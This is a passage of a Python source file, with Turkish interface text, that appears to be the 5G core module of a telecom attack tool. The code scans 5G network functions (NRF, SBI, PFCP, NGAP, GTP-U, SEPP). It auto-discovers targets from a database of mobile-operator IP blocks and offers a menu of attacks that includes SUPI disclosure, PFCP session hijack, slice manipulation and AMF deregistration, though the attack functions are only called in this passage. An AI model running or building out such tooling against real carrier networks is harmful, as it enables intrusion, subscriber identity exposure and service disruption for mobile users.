    results['open_ports'].sort()

    if not results['open_ports']:
        print("  [-] Acik TCP portu bulunamadi")

    # Phase 2: SBI endpoint discovery
    print(f"\n[2/6] SBI endpoint kesfetme...")
    http_ports = [p for p in results['open_ports'] if p not in (8805, 2152, 38412, 38472)]
    if not http_ports:
        http_ports = [8443, 443]  # Try defaults anyway

    for port in http_ports[:5]:  # Limit to first 5 HTTP ports
        use_tls = port in (443, 8443) or port > 8000
        for path in SBI_PATHS[:10]:  # Limit for speed
            sbi_result = scan_sbi_endpoint(ip, port, path, timeout, use_tls)
            if sbi_result['accessible']:
                results['sbi_endpoints'].append(sbi_result)
                print(f"  \033[32m[+] {port}{path}: HTTP {sbi_result['status']}\033[0m")
                if sbi_result['server']:
                    print(f"      Server: {sbi_result['server']}")
                if sbi_result['vendor']:
                    results['vendor'] = sbi_result['vendor']
                    print(f"      Vendor: {sbi_result['vendor']}")

    # Phase 3: NRF Discovery
    print(f"\n[3/6] NRF kesfetme...")
    nrf_ports = [p for p in results['open_ports'] if p in (8443, 29510, 443)]
    if not nrf_ports:
        nrf_ports = [8443]
    for port in nrf_ports[:2]:
        use_tls = port in (443, 8443)
        nfs = discover_nrf(ip, port, timeout, use_tls)
        if nfs:
            results['nrf_nfs'].extend(nfs)
            results['vulnerabilities'].append({
                'type': 'NRF_OPEN_DISCOVERY',
                'severity': 'HIGH',
                'detail': f'{len(nfs)} NF instance auth olmadan kesfedildi'
            })

    # Phase 4: PFCP scan
    print(f"\n[4/6] PFCP (N4) tarama...")
    results['pfcp'] = scan_pfcp(ip, 8805, timeout)
    if results['pfcp']['vulnerable']:
        results['vulnerabilities'].append({
            'type': 'PFCP_NO_AUTH',
            'severity': 'CRITICAL',
            'detail': 'PFCP Association auth olmadan kabul edildi'
        })

    # Phase 5: NGAP scan
    print(f"\n[5/6] NGAP (N2) tarama...")
    results['ngap'] = scan_ngap(ip, 38412, timeout)

    # Phase 6: GTP-U scan
    print(f"\n[6/6] GTP-U (N3) tarama...")
    results['gtpu'] = scan_gtpu(ip, 2152, timeout)

    # SEPP scan if 443 is open
    if 443 in results['open_ports'] or 8443 in results['open_ports']:
        sepp_port = 443 if 443 in results['open_ports'] else 8443
        print(f"\n[+] SEPP/N32 tarama (port {sepp_port})...")
        results['sepp'] = scan_sepp(ip, sepp_port, timeout)

    # Summary
    print(f"\n{'='*60}")
    print(f" SONUC OZETI: {ip}")
    print(f"{'='*60}")
    print(f"  Acik Portlar     : {results['open_ports']}")
    print(f"  SBI Endpointleri : {len(results['sbi_endpoints'])}")
    print(f"  NRF NF'ler       : {len(results['nrf_nfs'])}")
    print(f"  PFCP             : {'AKTIF' if results['pfcp']['heartbeat'] else 'Yanit yok'}")
    print(f"  NGAP             : {'ACIK' if results['ngap']['accessible'] else 'Kapali/SCTP'}")
    print(f"  GTP-U            : {'AKTIF' if results['gtpu']['accessible'] else 'Yanit yok'}")
    if results['vendor']:
        print(f"  Vendor           : {results['vendor']}")
    if results['vulnerabilities']:
        print(f"\n  \033[31mZAFIYETLER ({len(results['vulnerabilities'])}):\033[0m")
        for v in results['vulnerabilities']:
            print(f"    [{v['severity']}] {v['type']}: {v['detail']}")

    return results


def batch_5g_scan(targets, timeout=3, max_workers=5):
    """Batch scan multiple 5G targets."""
    all_results = []

    print(f"\n[+] Toplu 5G Tarama: {len(targets)} hedef")
    print(f"{'='*60}")

    for i, ip in enumerate(targets, 1):
        print(f"\n[{i}/{len(targets)}] Taraniyor: {ip}")
        try:
            result = scan_5g_target(ip, timeout=timeout, max_workers=max_workers)
            all_results.append(result)
        except KeyboardInterrupt:
            print("\n[!] Tarama kullanici tarafindan durduruldu.")
            break
        except Exception as e:
            print(f"  \033[31m[-] Hata: {e}\033[0m")
            all_results.append({'ip': ip, 'error': str(e)})

    return all_results


# ============================================
# AUTO IP DISCOVERY / GENERATION
# ============================================

def generate_ips_from_range(ip_range):
    """IP range'den IP listesi olustur (CIDR destekli)."""
    ips = []
    try:
        import ipaddress
        network = ipaddress.ip_network(ip_range, strict=False)
        # Limit to first 254 IPs for safety
        for ip in list(network.hosts())[:254]:
            ips.append(str(ip))
    except ImportError:
        # Fallback: parse simple ranges like 10.0.0.1-10.0.0.254
        if '-' in ip_range and '/' not in ip_range:
            try:
                start_ip, end_ip = ip_range.split('-')
                start_parts = start_ip.strip().split('.')
                end_parts = end_ip.strip().split('.')
                if len(start_parts) == 4 and len(end_parts) == 4:
                    base = '.'.join(start_parts[:3])
                    start_last = int(start_parts[3])
                    end_last = int(end_parts[3])
                    for i in range(start_last, min(end_last + 1, 255)):
                        ips.append(f"{base}.{i}")
            except Exception:
                pass
    except Exception as e:
        print(f"[-] IP range parse hatasi: {e}")
    
    return ips


def scan_local_network():
    """Yerel agdaki 5G portlarini tara."""
    print("\n[+] Yerel ag taramasi baslatiliyor...")
    
    # Get local IP
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        # Generate network range
        parts = local_ip.split('.')
        network_base = '.'.join(parts[:3])
        print(f"[*] Yerel ag: {network_base}.0/24")
        
        # Scan common 5G ports on local network
        targets = []
        for i in range(1, 255):
            ip = f"{network_base}.{i}"
            if ip != local_ip:  # Skip self
                targets.append(ip)
        
        print(f"[*] {len(targets)} IP taranacak (8443, 8805, 29510 portlari)...")
        
        # Quick port scan on 5G ports
        found_targets = []
        for ip in targets:
            for port in [8443, 8805, 29510]:
                if _tcp_scan(ip, port, timeout=1):
                    print(f"  \033[32m[+] {ip}:{port} ACIK\033[0m")
                    if ip not in found_targets:
                        found_targets.append(ip)
                    break
        
        return found_targets
        
    except Exception as e:
        print(f"[-] Yerel ag tarama hatasi: {e}")
        return []


def auto_discover_targets():
    """Otomatik hedef kesfetme - bilinen IP bloklari + yerel ag."""
    print("\n" + "="*60)
    print(" OTOMATIK 5G HEDEF KESFETME")
    print("="*60)
    print("\n[1] Bilinen 5G Operator Bloklari")
    print("[2] Yerel Ag Tarama")
    print("[3] Manuel IP Blogu Gir")
    print("[4] Shodan API (gelecek)")
    print()
    
    choice = _get_input("Secim", "1")
    
    targets = []
    
    if choice == "1":
        # Known operator blocks
        print("\nBilinen 5G operatorler:")
        operators = list(KNOWN_5G_INFRA.keys())
        for i, op in enumerate(operators, 1):
            print(f"  {i}) {op}")
        
        op_choice = _get_input(f"Operator secin (1-{len(operators)})", "1")
        try:
            op_idx = int(op_choice) - 1
            if 0 <= op_idx < len(operators):
                op_name = operators[op_idx]
                ranges = KNOWN_5G_INFRA[op_name]['ranges']
                print(f"\n[+] {op_name} IP bloklari: {ranges}")
                
                for ip_range in ranges:
                    print(f"[*] {ip_range} blogundan IP'ler olusturuluyor...")
                    ips = generate_ips_from_range(ip_range)
                    # Limit for safety
                    targets.extend(ips[:50])
                    print(f"    {len(ips[:50])} IP eklendi")
        except (ValueError, IndexError):
            print("[-] Gecersiz secim")
    
    elif choice == "2":
        # Local network scan
        targets = scan_local_network()
    
    elif choice == "3":
        # Manual IP block
        ip_block = _get_input("IP blogu (CIDR veya range)", "192.168.1.0/24")
        print(f"[*] {ip_block} parse ediliyor...")
        targets = generate_ips_from_range(ip_block)
        print(f"[+] {len(targets)} IP olusturuldu")
    
    elif choice == "4":
        print("\n[!] Shodan API entegrasyonu gelecek surumde eklenecek.")
        print("[*] Simdilik manuel IP veya bilinen bloklari kullanin.")
        return []
    
    return targets


# ============================================
# KNOWN 5G INFRASTRUCTURE DATABASE
# ============================================

def show_known_infra():
    """Display known 5G infrastructure information."""
    print(f"\n{'='*60}")
    print(f" Bilinen 5G Altyapilari")
    print(f"{'='*60}")

    for name, info in KNOWN_5G_INFRA.items():
        print(f"\n  {name}:")
        print(f"    IP Bloklari: {', '.join(info['ranges'])}")
        print(f"    Not: {info['notes']}")

    print(f"\n{'='*60}")
    print(f" Tarama Portlari Referansi")
    print(f"{'='*60}")
    print(f"  {'Port':>8s}  {'Protokol':15s}  {'Aciklama'}")
    print(f"  {'----':>8s}  {'--------':15s}  {'--------'}")
    print(f"  {'8443':>8s}  {'HTTPS/SBI':15s}  5G SBI varsayilan (TLS)")
    print(f"  {'443':>8s}  {'HTTPS':15s}  SEPP/N32 roaming")
    print(f"  {'8805':>8s}  {'PFCP/UDP':15s}  N4 arayuzu (SMF-UPF)")
    print(f"  {'38412':>8s}  {'NGAP/SCTP':15s}  N2 arayuzu (gNB-AMF)")
    print(f"  {'2152':>8s}  {'GTP-U/UDP':15s}  N3 arayuzu (gNB-UPF)")
    print(f"  {'29510':>8s}  {'HTTP/SBI':15s}  NRF")
    print(f"  {'29518':>8s}  {'HTTP/SBI':15s}  AMF")
    print(f"  {'29502':>8s}  {'HTTP/SBI':15s}  SMF")
    print(f"  {'29503':>8s}  {'HTTP/SBI':15s}  UDM")
    print(f"  {'29507':>8s}  {'HTTP/SBI':15s}  PCF")
    print(f"  {'29509':>8s}  {'HTTP/SBI':15s}  AUSF/NSSF")


def show_nf_info():
    """Show 5G NF type information."""
    print(f"\n{'='*60}")
    print(f" 5G Network Function (NF) Turleri")
    print(f"{'='*60}\n")

    for nf_type, info in NF_TYPES.items():
        path = info.get('path') or 'PFCP (UDP)'
        sbi = info.get('sbi_port')
        sbi_str = str(sbi) if sbi else 'N/A'
        print(f"  {nf_type:6s} | Port: {info['default_port']:5d} | SBI: {sbi_str:5s} | {info['description']}")
        print(f"         | Path: {path}")
        print()


# ============================================
# REPORT GENERATION
# ============================================

def save_results(results, prefix="5g_scan"):
    """Save scan results to JSON and TXT files."""
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    json_file = f"{prefix}_{ts}.json"
    txt_file = f"{prefix}_{ts}.txt"

    # JSON
    try:
        def make_serializable(obj):
            if isinstance(obj, (datetime.datetime, datetime.date)):
                return obj.isoformat()
            if isinstance(obj, bytes):
                return obj.hex()
            if isinstance(obj, set):
                return list(obj)
            return str(obj)

        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False, default=make_serializable)
        print(f"[+] JSON kayit: {json_file}")
    except Exception as e:
        print(f"[-] JSON kayit hatasi: {e}")

    # TXT Report
    try:
        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(" SigPloit 5G Core Network Tarama Raporu\n")
            f.write(f" Tarih: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")

            if isinstance(results, list):
                for r in results:
                    _write_single_result(f, r)
            elif isinstance(results, dict):
                _write_single_result(f, results)

        print(f"[+] TXT rapor: {txt_file}")
    except Exception as e:
        print(f"[-] TXT kayit hatasi: {e}")

    return json_file, txt_file


def _write_single_result(f, r):
    """Write a single scan result to file."""
    ip = r.get('ip', 'N/A')
    f.write(f"Hedef: {ip}\n")
    f.write(f"Zaman: {r.get('timestamp', 'N/A')}\n")
    f.write("-" * 40 + "\n")

    # Open ports
    ports = r.get('open_ports', [])
    f.write(f"Acik Portlar: {ports}\n")

    # SBI
    sbi = r.get('sbi_endpoints', [])
    if sbi:
        f.write(f"\nSBI Endpointleri ({len(sbi)}):\n")
        for ep in sbi:
            f.write(f"  {ep.get('port')}{ep.get('path')}: HTTP {ep.get('status')}\n")
            if ep.get('server'):
                f.write(f"    Server: {ep['server']}\n")
            if ep.get('vendor'):
                f.write(f"    Vendor: {ep['vendor']}\n")

    # NRF
    nfs = r.get('nrf_nfs', [])
    if nfs:
        f.write(f"\nNRF NF Instances ({len(nfs)}):\n")
        for nf in nfs:
            f.write(f"  {nf.get('type', '?'):8s} | ID: {nf.get('id', '?')[:20]} | Status: {nf.get('status', '?')}\n")

    # PFCP
    pfcp = r.get('pfcp')
    if pfcp:
        f.write(f"\nPFCP (N4):\n")
        f.write(f"  Heartbeat: {'Evet' if pfcp.get('heartbeat') else 'Hayir'}\n")
        f.write(f"  Association: {'Evet' if pfcp.get('association') else 'Hayir'}\n")
        f.write(f"  Zafiyet: {'EVET!' if pfcp.get('vulnerable') else 'Hayir'}\n")
        if pfcp.get('node_id'):
            f.write(f"  Node ID: {pfcp['node_id']}\n")

    # NGAP
    ngap = r.get('ngap')
    if ngap:
        f.write(f"\nNGAP (N2): {'Acik' if ngap.get('accessible') else 'Kapali'}\n")

    # GTP-U
    gtpu = r.get('gtpu')
    if gtpu:
        f.write(f"GTP-U (N3): {'Aktif' if gtpu.get('accessible') else 'Yanit yok'}\n")

    # Vulnerabilities
    vulns = r.get('vulnerabilities', [])
    if vulns:
        f.write(f"\nZAFIYETLER ({len(vulns)}):\n")
        for v in vulns:
            f.write(f"  [{v['severity']}] {v['type']}: {v['detail']}\n")

    f.write("\n" + "=" * 60 + "\n\n")


# ============================================
# MENU SYSTEM (while True loop - no recursion)
# ============================================

_last_scan_results = None

def fiveg_menu():
    """5G Core Network security scanning menu."""
    global _last_scan_results

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')

        print("\033[36m" + "=" * 60 + "\033[0m")
        print("\033[36m 5G Core Network Guvenlik Taramasi\033[0m")
        print("\033[36m" + "=" * 60 + "\033[0m")
        print()
        print("  \033[33mKESIF:\033[0m")
        print("  0) Kapsamli 5G Tarama (Tam)")
        print("  1) NRF Kesfetme (Network Repository)")
        print("  2) SBI Endpoint Tarama (HTTP/2)")
        print("  3) PFCP Tarama (N4 - UPF/SMF)")
        print("  4) NGAP Tarama (N2 - gNB/AMF)")
        print("  5) GTP-U Tarama (N3 - User Plane)")
        print("  6) SEPP/N32 Tarama (Roaming)")
        print("  7) Toplu 5G Tarama (Dosyadan)")
        print()
        print("  \033[31mSALDIRI TESTLERI:\033[0m")
        print("  8) NRF Discovery Abuse")
        print("  9) SUPI Disclosure")
        print("  10) PFCP Session Hijack")
        print("  11) Slice Manipulation")
        print("  12) AMF Deregistration")
        print()
        print("  \033[37mBILGI:\033[0m")
        print("  13) 5G NF Turleri Bilgi")
        print("  14) Bilinen 5G Altyapilari")
        print("  15) Sonuclari Kaydet")
        print("  \033[32m16) Otomatik IP Bul + Tarama\033[0m")
        print()
        print("  Geri donmek icin '\033[33mback\033[0m' yazin")
        print()

        choice = input("\033[37m(\033[0m\033[2;31m5g\033[0m\033[37m)>\033[0m ").strip().lower()

        if choice in ('back', 'geri', 'q', 'quit'):
            return

        elif choice == "0":
            _menu_full_scan()

        elif choice == "1":
            _menu_nrf_discovery()

        elif choice == "2":
            _menu_sbi_scan()

        elif choice == "3":
            _menu_pfcp_scan()

        elif choice == "4":
            _menu_ngap_scan()

        elif choice == "5":
            _menu_gtpu_scan()

        elif choice == "6":
            _menu_sepp_scan()

        elif choice == "7":
            _menu_batch_scan()

        elif choice == "8":
            _menu_attack_nrf()

        elif choice == "9":
            _menu_attack_supi()

        elif choice == "10":
            _menu_attack_pfcp()

        elif choice == "11":
            _menu_attack_slice()

        elif choice == "12":
            _menu_attack_amf()

        elif choice == "13":
            show_nf_info()
            input("\nDevam etmek icin Enter'a basin...")

        elif choice == "14":
            show_known_infra()
            input("\nDevam etmek icin Enter'a basin...")

        elif choice == "15":
            _menu_save_results()

        elif choice == "16":
            _menu_auto_discover()

        else:
            print('\n\033[31m[-]Hata:\033[0m Gecerli bir secim yapin (0-16)')
            time.sleep(1.5)


# ============================================
# MENU HANDLERS
# ============================================

def _menu_full_scan():
    """Kapsamli 5G tarama menusu."""
    global _last_scan_results

    ip = _get_input("Hedef IP", "10.0.0.1")
    if not _is_valid_ip(ip):
        print(f"\033[31m[-] Gecersiz IP: {ip}\033[0m")
        time.sleep(2)
        return

    ports_str = _get_input("Portlar (virgul ile, bos=varsayilan)", "")
    if ports_str:
        try:
            ports = [int(p.strip()) for p in ports_str.split(',') if p.strip()]
        except ValueError:
            print("[!] Gecersiz port listesi, varsayilanlar kullaniliyor.")
            ports = None
    else:
        ports = None

    timeout = _prompt_int("Zaman asimi (sn)", 5, 1, 30)

    results = scan_5g_target(ip, ports, timeout)
    _last_scan_results = results

    # Auto-save
    save_results(results, f"5g_full_{ip}")
    input("\nDevam etmek icin Enter'a basin...")


def _menu_nrf_discovery():
    """NRF kesfetme menusu."""
    global _last_scan_results

    ip = _get_input("NRF IP adresi", "10.0.0.1")
    port = _prompt_int("NRF Port", 8443, 1, 65535)
    use_tls = _get_input("HTTPS kullan? (e/h)", "e").lower() in ('e', 'y', 'yes')

    nfs = discover_nrf(ip, port, timeout=5, use_https=use_tls)

    if nfs:
        print(f"\n[+] {len(nfs)} NF bulundu:")
        for nf in nfs:
            svcs = ', '.join(nf.get('services', [])[:3])
            print(f"  {nf['type']:8s} | {nf['id'][:20]} | {nf['status']} | {svcs}")
        _last_scan_results = {'nrf_nfs': nfs, 'ip': ip}
    else:
        print("\n[-] NF bulunamadi veya NRF erisilemiyor.")

    input("\nDevam etmek icin Enter'a basin...")


def _menu_sbi_scan():
    """SBI endpoint tarama menusu."""
    ip = _get_input("Hedef IP", "10.0.0.1")
    port = _prompt_int("Hedef Port", 8443, 1, 65535)
    use_tls = _get_input("HTTPS kullan? (e/h)", "e").lower() in ('e', 'y', 'yes')

    print(f"\n[+] {len(SBI_PATHS)} SBI endpoint taranacak...\n")

    found = []
    for path in SBI_PATHS:
        result = scan_sbi_endpoint(ip, port, path, use_https=use_tls)
        if result['accessible']:
            found.append(result)
            print(f"  \033[32m[+] {path}: HTTP {result['status']}\033[0m")
            if result['server']:
                print(f"      Server: {result['server']}")
            if result['vendor']:
                print(f"      Vendor: {result['vendor']}")
        else:
            status_text = {-1: 'Reddedildi', -2: 'Zaman asimi', -3: 'Hata'}.get(result['status'], str(result['status']))
            print(f"  [-] {path}: {status_text}")

    print(f"\n[+] Bulunan SBI endpoint: {len(found)}/{len(SBI_PATHS)}")
    input("\nDevam etmek icin Enter'a basin...")


def _menu_pfcp_scan():
    """PFCP tarama menusu."""
    ip = _get_input("Hedef IP (UPF/SMF)", "10.0.0.1")
    port = _prompt_int("PFCP Port", 8805, 1, 65535)

    result = scan_pfcp(ip, port)

    print(f"\n[+] PFCP Sonuc:")
    print(f"  Heartbeat   : {'Evet' if result['heartbeat'] else 'Hayir'}")
    print(f"  Association : {'Evet' if result['association'] else 'Hayir'}")
    print(f"  Node ID     : {result.get('node_id', 'N/A')}")
    print(f"  Detay       : {result['details']}")

    if result['vulnerable']:
        print(f"\n  \033[31m[!!!] ZAFIYET: PFCP Association kimlik dogrulamasi yok!\033[0m")
        print(f"  [!!!] UPF oturumlari manipule edilebilir!")

    input("\nDevam etmek icin Enter'a basin...")


def _menu_ngap_scan():
    """NGAP tarama menusu."""
    ip = _get_input("Hedef IP (AMF)", "10.0.0.1")
    port = _prompt_int("NGAP Port", 38412, 1, 65535)

    result = scan_ngap(ip, port)

    print(f"\n[+] NGAP Sonuc:")
    print(f"  Erisim: {'Evet' if result['accessible'] else 'Hayir'}")
    print(f"  Detay : {result['details']}")

    input("\nDevam etmek icin Enter'a basin...")


def _menu_gtpu_scan():
    """GTP-U tarama menusu."""
    ip = _get_input("Hedef IP (UPF/gNB)", "10.0.0.1")
    port = _prompt_int("GTP-U Port", 2152, 1, 65535)

    result = scan_gtpu(ip, port)

    print(f"\n[+] GTP-U Sonuc:")
    print(f"  Erisim: {'Evet' if result['accessible'] else 'Hayir'}")
    print(f"  Detay : {result['details']}")

    input("\nDevam etmek icin Enter'a basin...")


def _menu_sepp_scan():
    """SEPP/N32 tarama menusu."""
    ip = _get_input("Hedef SEPP IP", "10.0.0.1")
    port = _prompt_int("Port", 443, 1, 65535)

    result = scan_sepp(ip, port)

    print(f"\n[+] SEPP/N32 Sonuc:")
    print(f"  Erisim: {'Evet' if result['accessible'] else 'Hayir'}")
    if result['tls_info']:
        print(f"  TLS   : {result['tls_info']}")
    if result['details']:
        print(f"  Detay : {result['details']}")

    input("\nDevam etmek icin Enter'a basin...")


def _menu_batch_scan():
    """Toplu 5G tarama menusu."""
    global _last_scan_results

    print("\nHedef dosyasi girin (her satirda bir IP):")
    filename = _get_input("Dosya", "targets_5g.txt")

    if os.path.exists(filename):
        with open(filename, 'r') as f:
            ips = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    else:
        print("[-] Dosya bulunamadi. Manuel giriyor:")
        ips = []
        while True:
            ip = input("  IP (bos = bitir): ").strip()
            if not ip:
                break
            if _is_valid_ip(ip):
                ips.append(ip)
            else:
                print(f"  [!] Gecersiz IP: {ip}")

    if not ips:
        print("[-] Hedef yok.")
        input("\nDevam etmek icin Enter'a basin...")
        return

    timeout = _prompt_int("Zaman asimi (sn)", 3, 1, 30)

    all_results = batch_5g_scan(ips, timeout)
    _last_scan_results = all_results

    # Summary table
    print(f"\n{'='*70}")
    print(f" TOPLU 5G TARAMA SONUCLARI")
    print(f"{'='*70}")
    print(f"  {'IP':>16s} | {'Portlar':20s} | {'SBI':4s} | {'PFCP':4s} | {'NGAP':4s} | {'GTP':4s}")
    print(f"  {'-'*16} | {'-'*20} | {'-'*4} | {'-'*4} | {'-'*4} | {'-'*4}")

    for r in all_results:
        if 'error' in r:
            print(f"  {r['ip']:>16s} | HATA: {r['error'][:40]}")
            continue
        ports_str = ','.join(str(p) for p in r.get('open_ports', [])[:5])
        sbi = str(len(r.get('sbi_endpoints', [])))
        pfcp = 'E' if r.get('pfcp', {}).get('heartbeat') else '-'
        ngap = 'E' if r.get('ngap', {}).get('accessible') else '-'
        gtpu = 'E' if r.get('gtpu', {}).get('accessible') else '-'
        print(f"  {r['ip']:>16s} | {ports_str:20s} | {sbi:4s} | {pfcp:4s} | {ngap:4s} | {gtpu:4s}")

    # Auto-save
    save_results(all_results, "5g_batch")
    input("\nDevam etmek icin Enter'a basin...")


def _menu_attack_nrf():
    """NRF Discovery saldiri menusu."""
    ip = _get_input("NRF IP", "10.0.0.1")
    port = _prompt_int("Port", 8443, 1, 65535)
    use_tls = _get_input("HTTPS? (e/h)", "e").lower() in ('e', 'y')

    attack_nrf_discovery(ip, port, use_tls)
    input("\nDevam etmek icin Enter'a basin...")


def _menu_attack_supi():
    """SUPI Disclosure saldiri menusu."""
    ip = _get_input("UDM IP", "10.0.0.1")
    port = _prompt_int("Port", 8443, 1, 65535)
    supi = _get_input("Hedef SUPI (IMSI)", "imsi-286010000000001")
    use_tls = _get_input("HTTPS? (e/h)", "e").lower() in ('e', 'y')

    attack_supi_disclosure(ip, port, use_tls, supi)
    input("\nDevam etmek icin Enter'a basin...")


def _menu_attack_pfcp():
    """PFCP Session Hijack menusu."""
    ip = _get_input("UPF IP", "10.0.0.1")
    port = _prompt_int("PFCP Port", 8805, 1, 65535)

    teid_str = _get_input("Hedef TEID (bos=yok)", "")
    teid = None
    if teid_str:
        try:
            teid = int(teid_str)
        except ValueError:
            pass

    attack_pfcp_session_hijack(ip, port, teid)
    input("\nDevam etmek icin Enter'a basin...")


def _menu_attack_slice():
    """Slice Manipulation menusu."""
    ip = _get_input("NSSF IP", "10.0.0.1")
    port = _prompt_int("Port", 8443, 1, 65535)
    use_tls = _get_input("HTTPS? (e/h)", "e").lower() in ('e', 'y')

    attack_slice_manipulation(ip, port, use_tls)
    input("\nDevam etmek icin Enter'a basin...")


def _menu_attack_amf():
    """AMF Deregistration menusu."""
    ip = _get_input("AMF IP", "10.0.0.1")
    port = _prompt_int("Port", 8443, 1, 65535)
    supi = _get_input("Hedef SUPI", "imsi-286010000000001")
    use_tls = _get_input("HTTPS? (e/h)", "e").lower() in ('e', 'y')

    attack_amf_deregistration(ip, port, use_tls, supi)
    input("\nDevam etmek icin Enter'a basin...")


def _menu_save_results():
    """Sonuclari kaydet menusu."""
    global _last_scan_results

    if _last_scan_results is None:
        print("\n[-] Henuz tarama yapilmamis, kaydedecek sonuc yok.")
        input("\nDevam etmek icin Enter'a basin...")
        return

    prefix = _get_input("Dosya on eki", "5g_results")
    save_results(_last_scan_results, prefix)
    input("\nDevam etmek icin Enter'a basin...")


def _menu_auto_discover():
    """Otomatik IP bulma + tarama menusu."""
    global _last_scan_results

    targets = auto_discover_targets()

    if not targets:
        print("\n[-] Hedef bulunamadi.")
        input("\nDevam etmek icin Enter'a basin...")
        return

    print(f"\n[+] {len(targets)} hedef bulundu:")
    for i, ip in enumerate(targets[:10], 1):
        print(f"  {i}) {ip}")
    if len(targets) > 10:
        print(f"  ... ve {len(targets) - 10} hedef daha")

    # Confirm
    confirm = _get_input(f"\n{len(targets)} hedefe tarama baslatilsin mi? (e/h)", "e")
    if confirm.lower() not in ('e', 'y', 'yes', 'evet'):
        print("[-] Tarama iptal edildi.")
        input("\nDevam etmek icin Enter'a basin...")
        return

    # Batch scan
    timeout = _prompt_int("Zaman asimi (sn)", 3, 1, 30)
    max_workers = _prompt_int("Paralel islem sayisi", 5, 1, 20)

    all_results = batch_5g_scan(targets, timeout, max_workers)
    _last_scan_results = all_results

    # Summary
    print(f"\n{'='*70}")
    print(f" OTOMATIK TARAMA SONUCLARI")
    print(f"{'='*70}")
    
    vulnerable_count = 0
    active_count = 0
    
    for r in all_results:
        if 'error' in r:
            continue
        
        if r.get('open_ports'):
            active_count += 1
        
        if r.get('vulnerabilities'):
            vulnerable_count += 1
            print(f"\n\033[31m[!] {r['ip']} - {len(r['vulnerabilities'])} ZAFIYET!\033[0m")
            for v in r['vulnerabilities']:
                print(f"    [{v['severity']}] {v['type']}")
    
    print(f"\n{'='*70}")
    print(f"  Toplam Hedef    : {len(all_results)}")
    print(f"  Aktif Hedefler  : {active_count}")
    print(f"  Zafiyetli       : \033[31m{vulnerable_count}\033[0m")
    print(f"{'='*70}")

    # Auto-save
    save_results(all_results, "5g_auto_scan")
    input("\nDevam etmek icin Enter'a basin...")


# ============================================
# ENTRY POINT
# ============================================

if __name__ == "__main__":
    try:
        fiveg_menu()
    except KeyboardInterrupt:
        print("\n[!] 5G modulu kapatiliyor...")
        sys.exit(0)
